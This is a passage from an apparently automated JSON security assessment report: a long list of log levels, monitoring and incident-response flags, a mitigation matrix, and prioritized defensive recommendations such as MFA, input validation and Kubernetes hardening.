          "DEBUG",
          "DEBUG",
          "DEBUG",
          "CRITICAL",
          "ERROR",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "CRITICAL",
          "DEBUG",
          "CRITICAL",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "DEBUG",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "WARNING",
          "ERROR",
          "ERROR",
          "CRITICAL",
          "INFO",
          "DEBUG",
          "INFO",
          "WARNING",
          "WARNING",
          "WARNING",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "WARNING",
          "ERROR",
          "CRITICAL",
          "CRITICAL",
          "ERROR",
          "WARNING",
          "INFO",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "ERROR",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "INFO",
          "WARNING",
          "ERROR",
          "CRITICAL",
          "CRITICAL",
          "DEBUG",
          "ERROR",
          "DEBUG",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "DEBUG",
          "INFO",
          "ERROR",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "INFO",
          "INFO",
          "DEBUG",
          "WARNING",
          "ERROR",
          "ERROR",
          "WARNING",
          "DEBUG",
          "WARNING",
          "ERROR",
          "CRITICAL",
          "INFO",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "ERROR",
          "WARNING",
          "DEBUG",
          "WARNING",
          "WARNING",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "WARNING",
          "ERROR",
          "CRITICAL",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "WARNING",
          "WARNING",
          "WARNING",
          "WARNING",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "ERROR",
          "INFO",
          "INFO",
          "ERROR",
          "INFO",
          "ERROR",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "WARNING",
          "INFO",
          "INFO",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "INFO",
          "WARNING",
          "DEBUG",
          "INFO",
          "INFO",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "INFO",
          "INFO",
          "DEBUG",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "DEBUG",
          "WARNING",
          "ERROR",
          "ERROR",
          "WARNING",
          "DEBUG",
          "WARNING",
          "ERROR",
          "CRITICAL",
          "INFO",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "ERROR",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "INFO",
          "INFO",
          "DEBUG",
          "WARNING",
          "ERROR",
          "ERROR",
          "WARNING",
          "DEBUG",
          "WARNING",
          "ERROR",
          "CRITICAL",
          "INFO",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "WARNING",
          "WARNING",
          "WARNING",
          "WARNING",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "ERROR",
          "INFO",
          "INFO",
          "ERROR",
          "INFO",
          "ERROR",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO"
        ],
        "security_events_logged": true,
        "log_protection": false
      },
      "monitoring_systems": {
        "prometheus_metrics": true,
        "grafana_dashboards": true,
        "alerting_configured": true,
        "health_checks": true
      },
      "incident_response": {
        "playbooks_found": true,
        "automated_response": true,
        "escalation_procedures": true,
        "forensic_capabilities": true
      },
      "threat_detection": {
        "ids_ips_configured": true,
        "anomaly_detection": true,
        "threat_intelligence": true,
        "behavior_analysis": true
      }
    }
  },
  "mitigation_matrix": {
    "immediate_actions": [],
    "short_term_fixes": [],
    "long_term_improvements": [
      {
        "action": "Implement comprehensive SIEM solution",
        "priority": "MEDIUM",
        "timeline": "2-3 months",
        "effort": "HIGH"
      },
      {
        "action": "Achieve security compliance certifications",
        "priority": "MEDIUM",
        "timeline": "3-6 months",
        "effort": "HIGH"
      },
      {
        "action": "Establish security training program",
        "priority": "LOW",
        "timeline": "1-2 months",
        "effort": "MEDIUM"
      }
    ],
    "compliance_requirements": []
  },
  "recommendations": [
    {
      "priority": 1,
      "category": "Authentication",
      "title": "Implement comprehensive authentication framework",
      "description": "Deploy OAuth 2.0/OpenID Connect with multi-factor authentication",
      "impact": "CRITICAL",
      "effort": "HIGH",
      "timeline": "2-3 weeks"
    },
    {
      "priority": 2,
      "category": "Input Validation",
      "title": "Deploy input validation and sanitization",
      "description": "Implement comprehensive input validation to prevent injection attacks",
      "impact": "CRITICAL",
      "effort": "MEDIUM",
      "timeline": "1-2 weeks"
    },
    {
      "priority": 3,
      "category": "Infrastructure",
      "title": "Harden container and Kubernetes security",
      "description": "Implement security contexts, network policies, and RBAC",
      "impact": "HIGH",
      "effort": "MEDIUM",
      "timeline": "2-3 weeks"
    },
    {
      "priority": 4,
      "category": "Monitoring",
      "title": "Deploy security monitoring and SIEM",
      "description": "Implement comprehensive security logging and monitoring",
      "impact": "HIGH",
      "effort": "HIGH",
      "timeline": "1-2 months"
    },
    {
      "priority": 5,
      "category": "Compliance",
      "title": "Achieve security compliance certifications",
      "description": "Work towards OWASP, NIST, and ISO 27001 compliance",
      "impact": "MEDIUM",
      "effort": "HIGH",
      "timeline": "3-6 months"
    }
  ],
  "next_steps": [
    "Continue regular security monitoring",
    "Address remaining medium-risk vulnerabilities",
    "Enhance security monitoring capabilities",
    "Work towards compliance certifications",
    "Conduct quarterly security assessments"
  ],
  "appendices": {
    "detailed_scan_results": "See individual scan output files",
    "compliance_checklists": "Available in security documentation",
    "remediation_templates": "Provided in mitigation matrix"
  }
}